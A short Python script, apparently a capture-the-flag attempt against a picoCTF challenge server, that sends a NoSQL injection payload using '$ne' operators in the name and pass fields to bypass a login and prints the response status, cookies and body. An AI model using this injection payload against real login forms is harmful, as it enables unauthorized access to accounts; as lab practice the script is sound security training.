import requests
base = 'http://wily-courier.picoctf.net:49463'
# Try JSON content-type for NoSQL injection
s = requests.Session()
r = s.post(base, json={'name': {'$ne': ''}, 'pass': {'$ne': ''}})
print('JSON inj status:', r.status_code)
print('JSON inj len:', len(r.text))
print('Set-Cookie:', r.headers.get('Set-Cookie'))
print('Body preview:', r.text[:2000])
print('...')
print('Body tail:', r.text[-500:])